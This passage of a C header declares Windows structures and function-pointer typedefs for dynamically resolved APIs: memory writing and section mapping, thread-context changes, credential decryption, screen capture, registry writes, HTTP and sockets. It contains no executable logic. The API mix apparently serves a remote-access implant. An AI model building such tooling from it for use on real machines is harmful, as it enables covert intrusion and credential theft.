    SOCKET_ADDRESS Dhcpv6Server;
    BYTE Dhcpv6ClientDuid[MAX_DHCPV6_DUID_LENGTH];
    ULONG Dhcpv6ClientDuidLength;
    ULONG Dhcpv6Iaid;
#if (NTDDI_VERSION >= 0x06000100) /* NTDDI_VISTASP1 */
    PIP_ADAPTER_DNS_SUFFIX FirstDnsSuffix;
#endif
  } IP_ADAPTER_ADDRESSES_LH, *PIP_ADAPTER_ADDRESSES_LH;

  typedef struct _IP_ADAPTER_ADDRESSES_XP {
    __C89_NAMELESS union {
      ULONGLONG Alignment;
      __C89_NAMELESS struct {
	ULONG Length;
	DWORD IfIndex;
      };
    };
    struct _IP_ADAPTER_ADDRESSES_XP *Next;
    PCHAR AdapterName;
    PIP_ADAPTER_UNICAST_ADDRESS_XP    FirstUnicastAddress;
    PIP_ADAPTER_ANYCAST_ADDRESS_XP    FirstAnycastAddress;
    PIP_ADAPTER_MULTICAST_ADDRESS_XP  FirstMulticastAddress;
    PIP_ADAPTER_DNS_SERVER_ADDRESS_XP FirstDnsServerAddress;
    PWCHAR DnsSuffix;
    PWCHAR Description;
    PWCHAR FriendlyName;
    BYTE PhysicalAddress[MAX_ADAPTER_ADDRESS_LENGTH];
    DWORD PhysicalAddressLength;
    DWORD Flags;
    DWORD Mtu;
    DWORD IfType;
    IF_OPER_STATUS OperStatus;
    DWORD Ipv6IfIndex;
    DWORD ZoneIndices[16];
    PIP_ADAPTER_PREFIX_XP FirstPrefix;
  } IP_ADAPTER_ADDRESSES_XP,*PIP_ADAPTER_ADDRESSES_XP;

#if (_WIN32_WINNT >= 0x0600)
  typedef IP_ADAPTER_ADDRESSES_LH   IP_ADAPTER_ADDRESSES;
  typedef IP_ADAPTER_ADDRESSES_LH *PIP_ADAPTER_ADDRESSES;
#else /* _WIN32_WINNT >= 0x0501 */
  typedef IP_ADAPTER_ADDRESSES_XP   IP_ADAPTER_ADDRESSES;
  typedef IP_ADAPTER_ADDRESSES_XP *PIP_ADAPTER_ADDRESSES;
#endif

typedef struct
{
    DWORD   dwStructSize;
    LPWSTR  lpszScheme;
    DWORD   dwSchemeLength;
    INTERNET_SCHEME nScheme;
    LPWSTR  lpszHostName;
    DWORD   dwHostNameLength;
    INTERNET_PORT nPort;
    LPWSTR  lpszUserName;
    DWORD   dwUserNameLength;
    LPWSTR  lpszPassword;
    DWORD   dwPasswordLength;
    LPWSTR  lpszUrlPath;
    DWORD   dwUrlPathLength;
    LPWSTR  lpszExtraInfo;
    DWORD   dwExtraInfoLength;
} URL_COMPONENTS, *LPURL_COMPONENTS;
typedef URL_COMPONENTS URL_COMPONENTSW;
typedef LPURL_COMPONENTS LPURL_COMPONENTSW;

  typedef struct {
    FILETIME ftExpiry;
    FILETIME ftStart;
    LPTSTR lpszSubjectInfo;
    LPTSTR lpszIssuerInfo;
    LPTSTR lpszProtocolName;
    LPTSTR lpszSignatureAlgName;
    LPTSTR lpszEncryptionAlgName;
    DWORD dwKeySize;
  } INTERNET_CERTIFICATE_INFO,*LPINTERNET_CERTIFICATE_INFO;
typedef enum _PS_ATTRIBUTE_NUM {
	PsAttributeParentProcess, // in HANDLE
	PsAttributeDebugPort, // in HANDLE
	PsAttributeToken, // in HANDLE
	PsAttributeClientId, // out PCLIENT_ID
	PsAttributeTebAddress, // out PTEB
	PsAttributeImageName, // in PWSTR
	PsAttributeImageInfo, // out PSECTION_IMAGE_INFORMATION
	PsAttributeMemoryReserve, // in PPS_MEMORY_RESERVE
	PsAttributePriorityClass, // in UCHAR
	PsAttributeErrorMode, // in ULONG
	PsAttributeStdHandleInfo, // 10, in PPS_STD_HANDLE_INFO
	PsAttributeHandleList, // in PHANDLE
	PsAttributeGroupAffinity, // in PGROUP_AFFINITY
	PsAttributePreferredNode, // in PUSHORT
	PsAttributeIdealProcessor, // in PPROCESSOR_NUMBER
	PsAttributeUmsThread, // see UpdateProceThreadAttributeList in msdn (CreateProcessA/W...) in PUMS_CREATE_THREAD_ATTRIBUTES
	PsAttributeMitigationOptions, // in UCHAR
	PsAttributeProtectionLevel,
	PsAttributeSecureProcess, // since THRESHOLD (Virtual Secure Mode, Device Guard)
	PsAttributeJobList,
	PsAttributeMax
} PS_ATTRIBUTE_NUM;

typedef NTSTATUS (NTAPI *pNtCreateUserProcess)(
    PHANDLE ProcessHandle,
    PHANDLE ThreadHandle,
    ACCESS_MASK ProcessDesiredAccess,
    ACCESS_MASK ThreadDesiredAccess,
    PCOBJECT_ATTRIBUTES ProcessObjectAttributes,
    PCOBJECT_ATTRIBUTES ThreadObjectAttributes,
    ULONG ProcessFlags, // PROCESS_CREATE_FLAGS_*
    ULONG ThreadFlags, // THREAD_CREATE_FLAGS_*
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PPS_CREATE_INFO CreateInfo,
    PPS_ATTRIBUTE_LIST AttributeList
    );

typedef HANDLE (WINAPI *pCreateFileA)(
  LPCSTR                lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);

typedef bool (WINAPI *pReadFile)(
  HANDLE       hFile,
  LPVOID       lpBuffer,
  DWORD        nNumberOfBytesToRead,
  LPDWORD      lpNumberOfBytesRead,
  LPOVERLAPPED lpOverlapped
);

typedef BOOL (WINAPI *pWriteFile)(
  HANDLE       hFile,
  LPCVOID      lpBuffer,
  DWORD        nNumberOfBytesToWrite,
  LPDWORD      lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
);

#define TH32CS_SNAPHEAPLIST 0x00000001
#define TH32CS_SNAPPROCESS 0x00000002
#define TH32CS_SNAPTHREAD 0x00000004
#define TH32CS_SNAPMODULE 0x00000008
#define TH32CS_SNAPMODULE32 0x00000010
#define TH32CS_SNAPALL (TH32CS_SNAPHEAPLIST | TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD | TH32CS_SNAPMODULE)
#define TH32CS_INHERIT 0x80000000

typedef enum _MEMORY_INFORMATION_CLASS
{
    MemoryBasicInformation,                     // q: MEMORY_BASIC_INFORMATION
    MemoryWorkingSetInformation,                // q: MEMORY_WORKING_SET_INFORMATION
    MemoryMappedFilenameInformation,            // q: UNICODE_STRING
    MemoryRegionInformation,                    // q: MEMORY_REGION_INFORMATION
    MemoryWorkingSetExInformation,              // q: MEMORY_WORKING_SET_EX_INFORMATION // since VISTA
    MemorySharedCommitInformation,              // q: MEMORY_SHARED_COMMIT_INFORMATION // since WIN8
    MemoryImageInformation,                     // q: MEMORY_IMAGE_INFORMATION
    MemoryRegionInformationEx,                  // q: MEMORY_REGION_INFORMATION
    MemoryPrivilegedBasicInformation,           // q: MEMORY_BASIC_INFORMATION
    MemoryEnclaveImageInformation,              // q: MEMORY_ENCLAVE_IMAGE_INFORMATION // since REDSTONE3
    MemoryBasicInformationCapped,               // q: 10
    MemoryPhysicalContiguityInformation,        // q: MEMORY_PHYSICAL_CONTIGUITY_INFORMATION // since 20H1
    MemoryBadInformation,                       // q: MEMORY_BAD_INFORMATION // since WIN11
    MemoryBadInformationAllProcesses,           // qs: not implemented // since 22H1
    MemoryImageExtensionInformation,            // q: MEMORY_IMAGE_EXTENSION_INFORMATION // since 24H2
    MaxMemoryInfoClass
} MEMORY_INFORMATION_CLASS;



typedef BOOL(WINAPI* pCryptUnProtectData)(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB*pOptionalEntropy,PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct,DWORD dwFlags, DATA_BLOB* pDataOut);

typedef BOOL(WINAPI* pCryptStringToBinaryA)(
    LPCSTR pszString,
    DWORD  cchString,
    DWORD  dwFlags,
    BYTE* pbBinary,
    DWORD* pcbBinary,
    DWORD* pdwSkip,
    DWORD* pdwFlags
);

typedef HANDLE (WINAPI *pCreateEventW)(LPSECURITY_ATTRIBUTES lpEventAttributes, WINBOOL bManualReset, WINBOOL bInitialState, LPCWSTR lpName);
typedef BOOL   (WINAPI *pResetEvent)(HANDLE hEvent);
typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef BOOL   (WINAPI *pPeekNamedPipe)(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage);
typedef DWORD (WINAPI *pGetDriveTypeW)(LPCWSTR lpRootPathName);
typedef DWORD (WINAPI *pGetLogicalDriveStringsW)(DWORD nBufferLength, LPWSTR lpBuffer);

typedef BOOL(WINAPI* pCryptStringToBinaryW)(LPCWSTR pszString,DWORD cchString,DWORD dwFlags,BYTE* pbBinary,DWORD* pcbBinary,DWORD* pdwSkip,DWORD* pdwFlags);
typedef NTSTATUS (NTAPI *pRtlRandomEx)(PULONG Seed);
typedef NTSTATUS (NTAPI *pNtWriteFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLengt);
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
  IN HANDLE               ProcessHandle,
  IN OUT PVOID            *BaseAddress,
  IN OUT PSIZE_T          NumberOfBytesToProtect,
  IN ULONG                NewAccessProtection,
  OUT PULONG              OldAccessProtection);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
  HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
  SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS (NTAPI *pNtResumeThread)(
  HANDLE ThreadHandle, PULONG PreviousSuspendCount);

typedef NTSTATUS (NTAPI *pNtContinue)(
    _In_ PCONTEXT ContextRecord,
    _In_ BOOLEAN TestAlert);

typedef NTSTATUS (NTAPI *pNtGetContextThread)(
    _In_ HANDLE ThreadHandle,
    _Inout_ PCONTEXT ThreadContext);

typedef NTSTATUS (NTAPI *pNtSetContextThread)(
    _In_ HANDLE ThreadHandle,
    _In_ PCONTEXT ThreadContext);

/* Undocumented ntdll timer APIs */
typedef NTSTATUS (NTAPI *pRtlCreateTimerQueue)(
    _Out_ PHANDLE TimerQueueHandle);

typedef NTSTATUS (NTAPI *pRtlCreateTimer)(
    _In_ HANDLE TimerQueueHandle,
    _Out_ PHANDLE TimerHandle,
    _In_ WAITORTIMERCALLBACK Callback,
    _In_opt_ PVOID Parameter,
    _In_ ULONG DueTime,
    _In_ ULONG Period,
    _In_ ULONG Flags);

typedef NTSTATUS(NTAPI *pNtQueryVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ MEMORY_INFORMATION_CLASS MemoryInformationClass,
    PVOID MemoryInformation,
    _In_ SIZE_T MemoryInformationLength,
    PSIZE_T ReturnLength
    );
typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(HANDLE, PVOID, PSIZE_T, ULONG);
typedef NTSTATUS (NTAPI *pNtCreateSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PCOBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
typedef NTSTATUS (NTAPI *pNtOpenSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
typedef NTSTATUS (NTAPI *pNtOpenDirectoryObject)(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes );
typedef NTSTATUS (NTAPI *pNtCreateProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PCOBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, BOOLEAN InheritObjectTable, HANDLE SectionHandle, HANDLE DebugPort, HANDLE TokenHandle);
typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef BOOL (WINAPI *pCreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef BOOL (WINAPI *pCreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
typedef BOOL (WINAPI *pSetHandleInformation)(HANDLE hObject, DWORD dwMask, DWORD dwFlags);
typedef VOID (WINAPI *pSleep)(DWORD dwMilliseconds);
typedef BOOL (WINAPI *pGetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);

/*
    Graphical utils---
*/
typedef HDC (WINAPI* pGetDC)(HWND hWnd);
typedef HDC (WINAPI* pCreateCompatibleDC)(HDC hdc);
typedef int (WINAPI* pGetSystemMetrics)(int nIndex);
typedef HBITMAP(WINAPI* pCreateCompatibleBitmap)(HDC hdc, int cx,int cy);
typedef BOOL (WINAPI* pBitBlt)(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
typedef HGDIOBJ (WINAPI* pSelectObject)(HDC hdc, HGDIOBJ h);
typedef int (WINAPI* pGetObjectW)(HANDLE h, int c, LPVOID pv);
typedef int (WINAPI* pGetDIBits)(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, LPVOID lpvBits, LPBITMAPINFO lpbmi, UINT usage);
typedef int(WINAPI* pReleaseDC)(HWND hWnd, HDC  hDC);

typedef BOOL(WINAPI* pDeleteDC)(HDC hDC);

typedef BOOL (WINAPI* pDeleteObject)(HGDIOBJ hObject);

typedef int (*pPrintf)(const char* format, ...);
typedef int (*pPuts)(const char *str);

typedef int (*pSprintf)(char *buffer, const char *format, ...);
typedef DWORD (WINAPI *pWNetGetProviderNameW)(LPDWORD lpdwNetType, LPWSTR lpProviderName, LPDWORD lpBufferSize);

typedef DWORD (WINAPI* pGetFileSize)(HANDLE  hFile,LPDWORD lpFileSizeHigh);
typedef HRESULT (WINAPI* pSHGetFolderPathA)(HWND hwnd,int csidl,HANDLE hToken,DWORD  dwFlags,LPSTR  pszPath);
typedef HRESULT (WINAPI* pSHGetFolderPathW)(HWND hwnd,int csidl,HANDLE hToken,DWORD  dwFlags,LPWSTR  pszPath);
typedef BOOL(WINAPI* pCryptUnprotectData)( DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB* pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags,DATA_BLOB* pDataOut);
typedef BOOL(WINAPI* pCryptStringToBinaryA)( LPCSTR pszString, DWORD cchString,DWORD dwFlags, BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip, DWORD* pdwFlags);
typedef BOOL(WINAPI* pCryptStringToBinaryW)(LPCWSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
typedef DWORD(WINAPI* pGetCurrentDirectoryA)(DWORD nBufferLength, LPSTR lpBuffer);
typedef HANDLE(WINAPI* pFindFirstFileA)(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData);
typedef DWORD(WINAPI* pGetFileAttributesA)(LPCSTR lpFileName);
typedef BOOL (WINAPI* pFindNextFileA)( HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL (WINAPI* pDeleteFileA)(LPCSTR lpFileName);
typedef BOOL (WINAPI* InternetGetConnectedState)( LPDWORD lpdwFlags,DWORD dwReserved);

typedef NTSTATUS (WINAPI* pLdrLoadDll)( PCWSTR DllPath, PULONG DllCharacteristics, PCUNICODE_STRING DllName, PVOID *DllHandle);
typedef UINT_PTR (WINAPI *pSetTimer)(HWND hWnd, UINT_PTR nIDEvent, UINT uElapse, TIMERPROC lpTimerFunc);


/* WinHttp.dll */
typedef INT (WINAPI* pMultiByteToWideChar)( UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte,LPWSTR lpWideCharStr,int cchWideChar);
typedef HINTERNET(WINAPI* pWinHttpOpen)(LPCWSTR pwszUserAgent, DWORD dwAccessType, LPCWSTR pwszProxyName, LPCWSTR pwszProxyBypass, DWORD dwFlags);
typedef HINTERNET(WINAPI* pWinHttpConnect)( HINTERNET hSession, LPCWSTR   pswzServerName, INTERNET_PORT nServerPort, DWORD dwFlags);
typedef HINTERNET(WINAPI* pWinHttpOpenRequest)( HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags);
typedef BOOL(WINAPI* pWinHttpSendRequest)( HINTERNET hRequest, LPCWSTR pwszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
typedef BOOL(WINAPI* pWinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);
typedef BOOL (WINAPI* pWinHttpQueryHeaders)( HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
typedef BOOL(WINAPI* pWinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef BOOL(WINAPI* pWinHttpCloseHandle)(HINTERNET hInternet);
typedef BOOL(WINAPI* pWinHttpCloseHandle)(HINTERNET hInternet);
typedef BOOL(WINAPI* pWinHttpReceiveResponse)(HINTERNET,LPVOID); 
typedef BOOL(WINAPI* pWinHttpCrackUrl)(LPCWSTR,DWORD,DWORD,LPURL_COMPONENTS);
typedef BOOL(WINAPI* pWinHttpSetOption)(HINTERNET,DWORD,LPVOID,DWORD);

typedef DWORD(WINAPI* pGetModuleFileNameA)(HMODULE hModule,LPSTR lpFilename, DWORD nSize);
typedef BOOL(WINAPI* pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX lpBuffer);
typedef BOOL(WINAPI* pCopyFileA)( LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
typedef HANDLE(WINAPI* pCreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName);
typedef HANDLE(WINAPI* pOpenMutexW)( DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR lpLibFileName);
typedef BOOL(WINAPI* pSetFileAttributesA)(LPCSTR lpFileName,DWORD  dwFileAttributes);

/* advapi32.dll */
typedef BOOL    (WINAPI* pCryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
typedef BOOL    (WINAPI* pCryptDestroyHash)(HCRYPTHASH hHash);
typedef BOOL    (WINAPI* pCryptGetHashParam)(HCRYPTHASH hHash, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags);
typedef BOOL    (WINAPI* pCryptBinaryToStringA)(CONST BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPSTR pszString, DWORD *pcchString);
typedef BOOL    (WINAPI* pCryptAcquireContextA)(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL    (WINAPI* pCryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);

typedef BOOL    (WINAPI* pCryptBinaryToStringA)(CONST BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPSTR pszString, DWORD *pcchString);
typedef BOOL    (WINAPI* pCryptHashData)(HCRYPTHASH hHash, CONST BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL    (WINAPI* pCryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
typedef LSTATUS (WINAPI* pRegOpenKeyExA)( HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
typedef LSTATUS (WINAPI* pRegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef LSTATUS (WINAPI* pRegCloseKey)(HKEY hKey);
typedef BOOL (WINAPI *pCryptGenRandom) (HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);

/* ws2_32.dll */
typedef int             (WINAPI *pWSAStartup        )(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET          (WINAPI *paccept            )(SOCKET s, struct sockaddr *addr,int *addrlen);
typedef int             (WINAPI *pbind              )(SOCKET s, const struct sockaddr *name,int namelen);
typedef int             (WINAPI *pclosesocket       )(SOCKET s);
typedef int             (WINAPI *pconnect           )(SOCKET s, const struct sockaddr *name,int namelen);
typedef int             (WINAPI *pIoctlsocket       )(SOCKET s, long cmd,u_long *argp);
typedef int             (WINAPI *pGetpeername       )(SOCKET s, struct sockaddr *name,int *namelen);
typedef int             (WINAPI *pGetsockname       )(SOCKET s, struct sockaddr *name,int *namelen);
typedef int             (WINAPI *pGetsockopt        )(SOCKET s, int level,int optname,char *optval,int *optlen);
typedef SOCKET          (WINAPI *psocket            )(int af,int type,int protocol);
typedef unsigned long   (WINAPI *pinet_addr         )(const char *cp);
typedef int             (WINAPI *psend              )(SOCKET s, const char *buf, int len, int flags);
typedef int             (WINAPI* precv              )(SOCKET s, char *buf , int len, int flags);
typedef VOID            (WINAPI* freeaddrinfo       )(PADDRINFOA pAddrInfo);
typedef int             (WINAPI* pWSACleanup        )();
typedef int             (WINAPI* pgetaddrinfo       )(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult);
typedef int             (WINAPI* pfreeaddrinfo      )(PADDRINFOA pAddrInfo);
typedef int             (WINAPI* pWSAGetLastError   )();
typedef int             (WINAPI* pselect            )(int nfds,fd_set *readfds,fd_set *writefds,fd_set *exceptfds,const PTIMEVAL timeout);
typedef int             (WINAPI* p__WSAFDIsSet      )(SOCKET unnamedParam1, fd_set *unnamedParam2);
typedef LPCSTR 		(WINAPI* pInetNtopA)(INT Family, LPCVOID pAddr, LPSTR pStringBuf, size_t StringBufSize);


typedef HRESULT (WINAPI* pVariantClear)(VARIANTARG *pvarg);
typedef VOID (WINAPI* pVariantInit)(VARIANTARG *pvarg);

/* SSPI and SChannel functions */
typedef SECURITY_STATUS (WINAPI *pAcquireCredentialsHandleA)(LPSTR, LPSTR, ULONG, VOID *, VOID *, VOID*, VOID *, PCredHandle, PTimeStamp);
typedef SECURITY_STATUS (WINAPI *pInitializeSecurityContextA)(
    PCredHandle phCredential,
    PCtxtHandle phContext,
    SEC_CHAR *pszTargetName,
    unsigned __LONG32 fContextReq,
    unsigned __LONG32 Reserved1,
    unsigned __LONG32 TargetDataRep,
    PSecBufferDesc pInput,
    unsigned __LONG32 Reserved2,
    PCtxtHandle phNewContext,
    PSecBufferDesc pOutput,
    unsigned __LONG32 *pfContextAttr,
    PTimeStamp ptsExpiry); // can be NULL
    
typedef SECURITY_STATUS (WINAPI *pCompleteAuthToken)(PCtxtHandle, PSecBufferDesc);
typedef SECURITY_STATUS (WINAPI *pQueryContextAttributes)(PCtxtHandle, ULONG, PVOID);
typedef SECURITY_STATUS (WINAPI *pFreeContextBuffer)(PVOID);
typedef SECURITY_STATUS (WINAPI *pDeleteSecurityContext)(PCtxtHandle);
typedef SECURITY_STATUS (WINAPI *pFreeCredentialsHandle)(PCredHandle);
typedef SECURITY_STATUS (WINAPI *pApplyControlToken)(PCtxtHandle, PSecBufferDesc);
typedef SECURITY_STATUS (WINAPI *pEncryptMessage)(PCtxtHandle, ULONG, PSecBufferDesc, ULONG);
typedef SECURITY_STATUS (WINAPI *pDecryptMessage)(PCtxtHandle, PSecBufferDesc, ULONG, PULONG);
typedef SECURITY_STATUS (WINAPI *pQuerySecurityPackageInfoA)(SEC_CHAR *pszPackageName,PSecPkgInfoA *ppPackageInfo);     
typedef DWORD (WINAPI* pGetTickCount)(VOID);

typedef BOOL (WINAPI *pMessageBeep)(UINT uType);
typedef WINBOOL (WINAPI *pShowWindow)(HWND hWnd,int nCmdShow);
typedef LRESULT (WINAPI *pDefWindowProcW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
typedef HWND (WINAPI *pCreateWindowExW)(DWORD dwExStyle,LPCWSTR lpClassName,LPCWSTR lpWindowName,DWORD dwStyle,int X,int Y,int nWidth,int nHeight,HWND hWndParent,HMENU hMenu,HINSTANCE hInstance,LPVOID lpParam);

typedef DWORD (WINAPI *pGetEnvironmentVariableW) (LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);
/*
    Crypt32.dll
    Certificate stuff
*/
  typedef PCCERT_CONTEXT (WINAPI *pCertGetIssuerCertificateFromStore)(HCERTSTORE hCertStore, PCCERT_CONTEXT pSubjectContext, PCCERT_CONTEXT pPrevIssuerContext, DWORD *pdwFlags);
  typedef WINBOOL (WINAPI *pCertVerifySubjectCertificateContext)(PCCERT_CONTEXT pSubject, PCCERT_CONTEXT pIssuer, DWORD *pdwFlags);
  typedef PCCERT_CONTEXT (WINAPI *pCertDuplicateCertificateContext)(PCCERT_CONTEXT pCertContext);
  typedef PCCERT_CONTEXT (WINAPI *pCertCreateCertificateContext)(DWORD dwCertEncodingType, const BYTE *pbCertEncoded, DWORD cbCertEncoded);
  typedef WINBOOL (WINAPI *pCertFreeCertificateContext)(PCCERT_CONTEXT pCertContext);
  typedef WINBOOL (WINAPI *pCertSetCertificateContextProperty)(PCCERT_CONTEXT pCertContext, DWORD dwPropId, DWORD dwFlags, const void *pvData);
  typedef BOOL (WINAPI *pCertGetCertificateContextProperty)(PCCERT_CONTEXT pCertContext, DWORD dwPropId, void *pvData, DWORD *pcbData);
  typedef NTSTATUS (NTAPI* pBCryptGenRandom)(
    HCRYPTPROV hProvider,
    PUCHAR     pbBuffer,
    ULONG      cbBuffer,
    ULONG      dwFlags
);

typedef DWORD (WINAPI *pGetLastError)(VOID);
typedef DWORD (WINAPI *pGetFileAttributesW)(LPCWSTR lpFileName);
typedef HANDLE (WINAPI *pFindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
typedef BOOL (WINAPI *pFindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
typedef DWORD (WINAPI *pGetCurrentDirectoryW)(DWORD nBufferLength, LPWSTR lpBuffer);
typedef BOOL (WINAPI *pDeleteFileW)(LPCWSTR lpFileName);
typedef HANDLE (WINAPI *pCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// Named pipe APIs
typedef HANDLE (WINAPI *pCreateNamedPipeW)(LPCWSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeout, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
typedef BOOL   (WINAPI *pConnectNamedPipe)(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);
typedef BOOL   (WINAPI *pWaitNamedPipeW)(LPCWSTR lpNamedPipeName, DWORD nTimeOut);
typedef BOOL   (WINAPI *pDisconnectNamedPipe)(HANDLE hNamedPipe);
typedef BOOL   (WINAPI *pSetNamedPipeHandleState)(HANDLE hNamedPipe, LPDWORD lpMode, LPDWORD lpMaxCollectionCount, LPDWORD lpCollectDataTimeout);
typedef BOOL (WINAPI *pCopyFileW)( LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, BOOL bFailIfExists);
typedef HMODULE (WINAPI *pLoadLibraryW)(LPCWSTR lpLibFileName);
typedef BOOL (WINAPI *pSetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
typedef BOOL (WINAPI *pRegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
